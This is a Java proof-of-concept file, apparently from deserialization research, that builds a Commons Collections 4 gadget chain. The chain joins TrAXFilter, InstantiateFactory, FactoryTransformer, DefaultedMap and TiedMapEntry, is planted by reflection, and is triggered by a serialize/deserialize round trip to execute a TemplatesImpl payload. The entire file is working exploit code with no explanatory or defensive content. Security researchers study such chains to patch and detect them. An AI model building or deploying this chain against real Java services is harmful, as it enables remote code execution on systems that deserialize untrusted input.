package com.example.CC4;

import com.example.Utils.ReflectionUtil;
import com.example.Utils.SerializeUtil;
import com.example.Utils.Share;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import org.apache.commons.collections4.functors.FactoryTransformer;
import org.apache.commons.collections4.functors.InstantiateFactory;
import org.apache.commons.collections4.keyvalue.TiedMapEntry;
import org.apache.commons.collections4.map.DefaultedMap;

import javax.xml.transform.Templates;
import java.util.HashMap;

public class POC_6 {

    public static void main(String[] args) throws Exception {
        Templates templates = Share.getTemplatesImplObj();
        InstantiateFactory factory = new InstantiateFactory<>(TrAXFilter.class, new Class[]{Templates.class}, new Object[]{templates});
        FactoryTransformer transformer = new FactoryTransformer<>(factory);

        DefaultedMap d = new DefaultedMap<>("1");
        TiedMapEntry t = new TiedMapEntry<>(d, "key");
        HashMap map = new HashMap<>();
        map.put(t, "value");

        ReflectionUtil.setField(d, "value", transformer);
        SerializeUtil.deserialize(SerializeUtil.serialize(map));
    }

}
